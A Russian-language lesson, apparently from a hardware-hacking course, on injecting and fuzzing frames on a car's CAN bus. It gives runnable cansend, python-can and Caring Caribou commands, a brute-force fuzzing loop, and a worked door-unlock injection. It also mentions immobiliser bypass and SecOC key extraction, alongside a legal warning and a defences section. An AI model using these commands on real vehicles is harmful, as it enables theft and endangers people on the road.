CAN (Controller Area Network) — это детерминированная широковещательная шина, спроектированная так, чтобы надёжно передавать данные в агрессивной электромагнитной среде. У неё нет адресации «от кого»: каждый кадр несёт только идентификатор (arbitration ID), и любой узел на шине может передать кадр с любым ID. Именно эта особенность делает CAN удобной целью: если у вас есть физический доступ к шине, вы можете не только читать трафик, но и подделывать сообщения, притворяясь любым ECU. Этот урок — про инъекцию и фаззинг: как найти нужные ID, как сгенерировать валидные кадры и как заставить автомобиль делать то, что вы хотите.

## Зачем этот урок

Базовый `hardware-can-bus` объясняет, что такое CAN и как его слушать, а `hardware-can-uds` — диагностику. Здесь фокус на активной стороне: инъекция кадров, фаззинг и идентификация сигналов. Это то, что превращает пассивный мониторинг в управление. В автомобиле инъекция открывает двери, глушит двигатель, подделывает показания датчиков и обходит иммобилайзер. На стенде и в CTF это задачи «зажги индикатор», «открой дверь», «увеличь скорость». Практический навык — не «послать случайный кадр», а системно определить, какой ID и какие байты отвечают за целевую функцию.

## CAN: кадры, арбитраж, скорости

Кадр CAN 2.0A (standard) содержит: Start of Frame (SOF), 11-битный идентификатор, RTR, IDE, DLC (длина данных 0–8), 0–8 байт данных, CRC, ACK и End of Frame. CAN 2.0B (extended) использует 29-битный ID. CAN FD расширяет данные до 64 байт и добавляет гибкую скорость данных.

Арбитраж — ключевая идея: если два узла передают одновременно, побеждает кадр с меньшим числовым ID (доминантные биты «0» перекрывают рецессивные «1»). Поэтому низкие ID (0x000–0x0FF) обычно зарезервированы за критичными сообщениями (тормоза, двигатель), а высокие — за некритичными. Для атакующего это подсказка: если нужно заглушить поток, отправляйте кадры с более низким ID.

Типовые скорости: 125 kbit/s (комфорт, старые авто), 250 kbit/s, 500 kbit/s (силовой агрегат), 1 Mbit/s (CAN FD data phase выше). Скорость должна совпадать с шиной, иначе кадры не читаются.

## Где и как подключаться

Точки доступа к CAN в автомобиле:

- **OBD-II порт** (пины 6 = CAN-H, 14 = CAN-L) — самый удобный, но за шлюзом (gateway), поэтому виден не весь трафик;
- **шина силового агрегата** — напрямую, но требует разбора;
- **шина комфорта** — за бардачком, под сиденьем;
- **подключаемые устройства** — регистраторы, сигнализации, CAN-адаптеры на OBD.

Аппаратные интерфейсы:

- **CANtact**, **Macchina M2**, **USB2CAN**, **Peak PCAN-USB**, **Kvaser**;
- **CANable / CANtact** (open hardware, SocketCAN);
- **Arduino + MCP2515** — дешёвый вариант для стенда;
- **ICSIM / SocketCAN vcan** — полностью виртуальный стенд.

Программно всё сводится к Linux SocketCAN:

```bash
# Поднять интерфейс CANable (slcan) на 500 кбит/с
sudo slcand -o -c -s6 /dev/ttyACM0 can0
sudo ip link set can0 up
ip -details link show can0
# Выключить
sudo ip link set can0 down
```

`-s6` соответствует 500 kbit/s в slcand. Для других скоростей: `-s4` = 125k, `-s5` = 250k, `-s7` = 800k, `-s8` = 1M.

## Инъекция кадров

Инъекция — это просто отправка кадра в шину. С can-utils:

```bash
# Стандартный кадр: 3 байта данных 01 02 03
cansend can0 123#010203
# Полные 8 байт
cansend can0 7DF#0201000000000000
# Extended (29-бит) ID
cansend can0 12345678#DEADBEEF
# RTR-кадр
cansend can0 123#R
# Повторять с интервалом (bash)
while true; do cansend can0 123#010203; sleep 0.1; done
```

Через Python (`python-can`) удобнее строить логику:

```python
import can, time
bus = can.interface.Bus(channel='can0', bustype='socketcan')
msg = can.Message(arbitration_id=0x123, data=[0x01, 0x02, 0x03], is_extended_id=False)
while True:
    bus.send(msg)
    time.sleep(0.05)
```

Ключевой момент: инъекция выигрывает арбитраж, только если ID меньше, чем у легитимного отправителя, либо если легитимный узел молчит. Если два узла шлют один ID, шина входит в error state (error counters растут) — этим можно «глушить» ECU, но это заметно и опасно.

## Фаззинг CAN

Фаззинг — систематический перебор ID и данных с наблюдением за реакцией. Цели: найти ID, на которые реагирует автомобиль (двери, свет, дворники), и значения, вызывающие ошибки/сбои.

Стратегии:

1. **Blind fuzzing** — перебор всех ID с случайными данными. Быстро, но много шума.
2. **Signal-aware fuzzing** — сначала снять нормальный трафик, определить периодические ID и их «спокойные» значения, затем варьировать один байт за раз.
3. **Bit-flipping** — инвертировать по одному биту в известном кадре (дифференциальный анализ).
4. **Replay + mutation** — воспроизвести записанный кадр, меняя поля.

Инструменты:

- **can-utils** (`cansniffer`, `candump`, `cansend`, `canbusload`);
- **Caring Caribou** (python, `cc.py`) — UDS и CAN-фаззинг;
- **ICSim** (Instrument Cluster Simulator) — виртуальная приборная панель, идеальна для тренировки;
- **CANalyzat0r**, **SavvyCAN** — анализ и фильтры;
- **python-can** + собственные скрипты;
- **Fuzzing frameworks**: `canfuzz`, `CANard`, `SocketCAN fuzzer`.

```bash
# Наблюдение за изменением трафика
cansniffer -c can0        # подсветка меняющихся байтов
candump -L can0 > log.txt # запись в лог
canbusload can0@500000    # загрузка шины

# Фаззинг одним байтом (пример логики)
for id in 0x100 0x101 0x200 0x3E8; do
  for v in $(seq 0 255); do
    cansend can0 $(printf '%03X' $id)#$(printf '%02X00000000000000' $v)
  done
done
```

## Диагностический фаззинг (UDS)

Если на шине есть диагностический трафик (ID 0x7E0–0x7E7), фаззинг UDS-сервисов может выявить скрытые возможности. Инструмент Caring Caribou:

```bash
# Автоматический перебор UDS-сервисов и субфункций
python3 cc.py -i can0 -a 0x7E0 discover
python3 cc.py -i can0 -a 0x7E0 security
python3 cc.py -i can0 -a 0x7E0 dump
# Фаззинг конкретного SID
python3 cc.py -i can0 -a 0x7E0 fuzz
```

Фаззинг диагностики опаснее обычного: случайный `10 02` (programming session) или `11 01` (ECU reset) может вывести ECU из строя.

## Инструменты и команды

```bash
# SocketCAN
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
sudo modprobe vcan
candump vcan0
cansend vcan0 123#1122334455667788
cansniffer -c vcan0
canplayer -I log.txt
canbusload vcan0@500000
cangen vcan0 -g 10 -I 123 -L 8 -D 100 -e
# cangen флаги: -g gap(ms), -I id, -L len, -D data, -e extended, -n count, -p poll

# ICSim (стенд)
./icsim vcan0 &          # приборная панель
./controls vcan0 &       # управление (стрелки/кнопки)

# Caring Caribou
python3 cc.py -i can0 -a 0x7E0 discover
python3 cc.py -i can0 -a 0x7E0 fuzz -s 0x27
python3 cc.py -i can0 -a 0x7E0 sub 0x27
```

Полезные флаги can-utils: `candump -l` логировать, `-L` в log-формате, `-n` число кадров, `-e` extended; `cansniffer -c` цветной; `canplayer -I file`; `cangen -e` extended ID, `-n` количество, `-p` poll.

## Разобранный пример: открыть дверь через CAN

**Дано:** ICSim или автомобиль на стенде. Нужно найти ID управления дверью.

**Шаг 1 — записать «спокойный» трафик.**

```bash
$ candump -L can0 > idle.log
$ wc -l idle.log
1204 idle.log
```

**Шаг 2 — найти периодические ID.**

```bash
$ awk '{print $3}' idle.log | cut -d'#' -f1 | sort | uniq -c | sort -rn | head
    300 0x100
    300 0x101
    150 0x200
     50 0x3E8
```

ID `0x100`, `0x101`, `0x200` периодические — кандидаты.

**Шаг 3 — дифференциальный анализ.** Нажимаем «открыть дверь» в приложении/контроллере и смотрим, какой ID изменился.

```bash
$ candump can0 | grep -E "0x19B"
  can0  19B   [8]  00 00 00 00 00 00 00 01
```

Байт 8 меняется с `00` на `01` — это сигнал двери.

**Шаг 4 — инъекция.**

```bash
$ cansend can0 19B#0000000000000001
$ cansend can0 19B#0000000000000000
```

Дверь открывается и закрывается. Мы научились управлять функцией по найденному ID и значению.

**Шаг 5 — углубление.** Для повторяющихся сигналов (скорость, обороты) используйте `cansniffer -c` — он подсвечивает байты, которые меняются, и помогает вычленить счётчики/CRC.

## Edge cases и защита

- **CAN gateway.** Современные авто ставят шлюз между OBD и силовыми шинами; через OBD видно только диагностику. Инъекция в силовую шину требует физического доступа к ней.
- **SecOC (Secure Onboard Communication).** Добавляет MAC и счётчик свежести; инъекция без правильного MAC отвергается. Реверс SecOC-ключа — отдельная задача.
- **CRC и счётчики.** Многие сигналы содержат счётчик и checksum; подделка без их пересчёта игнорируется приёмником.
- **Bus-off.** Агрессивная инъекция переводит узел в bus-off, что заметно по ошибкам.
- **Разные скорости.** Несовпадение bitrate = нет трафика.
- **Защита:** SecOC/AUTOSAR, шлюзы с фильтрацией ID, IDS на аномалии, подписанные сообщения, физическая защита шин.

## Частые ошибки

- Отправлять кадр с высоким ID и удивляться, что легитимный узел его «перебивает» (арбитраж).
- Фаззить вслепую на реальном авто без стенда — риск окирпичить ECU.
- Игнорировать gateway и считать, что OBD показывает всю шину.
- Забывать про CRC/счётчики и думать, что инъекция «не работает».
- Путать `-s` в slcand: неверный индекс = неверный bitrate.
- Правовые рамки: управление чужим авто — уголовное дело. Только стенд/своё авто.

## Что дальше / решение

- **ICSim** для безопасной тренировки инъекции и фаззинга.
- **SecOC-реверс**: ищите ключи в прошивке шлюза (см. `hardware-firmware-extract`).
- **UDS-эксплуатация** (см. `hardware-can-uds`) после фаззинга диагностики.
- **Защита на уровне архитектуры**: сегментирование шин, шлюз, SecOC, IDS.
